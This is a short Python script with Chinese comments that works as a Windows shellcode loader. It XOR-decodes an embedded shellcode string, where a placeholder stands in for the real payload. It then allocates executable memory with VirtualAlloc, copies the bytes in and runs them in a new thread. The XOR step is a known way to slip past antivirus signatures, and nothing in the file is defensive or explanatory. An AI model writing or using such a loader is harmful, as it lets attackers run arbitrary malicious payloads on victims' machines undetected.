import ctypes

#xor shellcode
xor_shellcode = "生成的shellcode"

#xor key
key = 11

shellcode = bytearray([ord(xor_shellcode[i]) ^ key for i in range(len(xor_shellcode))])

# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存：调用kernel32.dll动态链接库中的VirtualAlloc函数申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_int(0),  # 要分配的内存区域的地址
    ctypes.c_int(len(shellcode)), # 分配的大小
    ctypes.c_int(0x3000),  # 分配的类型，0x3000代表MEM_COMMIT | MEM_RESERVE
    ctypes.c_int(0x40) # 该内存的初始保护属性，0x40代表可读可写可执行属性
    )

# 调用kernel32.dll动态链接库中的RtlMoveMemory函数将shellcode移动到申请的内存中
buffered = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buffered,
    ctypes.c_int(len(shellcode))
)

# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0), # 指向安全属性的指针
    ctypes.c_int(0), # 初始堆栈大小
    ctypes.c_uint64(ptr), # 指向起始地址的指针
    ctypes.c_int(0), # 指向任何参数的指针
    ctypes.c_int(0), # 创建标志
    ctypes.pointer(ctypes.c_int(0)) # 指向接收线程标识符的值的指针
)

# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))